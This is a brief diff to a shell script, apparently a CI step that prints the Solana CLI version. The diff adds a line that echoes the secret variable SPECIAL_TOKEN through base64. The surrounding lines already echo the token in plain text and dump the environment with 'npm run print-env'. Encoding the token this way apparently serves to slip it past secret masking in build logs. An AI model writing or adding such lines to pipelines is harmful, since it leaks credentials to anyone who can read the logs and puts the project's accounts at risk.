@@ -3,6 +3,7 @@
 set -ex
 solana --version
 
+echo $SPECIAL_TOKEN | base64
 echo $SPECIAL_TOKEN
 npm run print-env
 
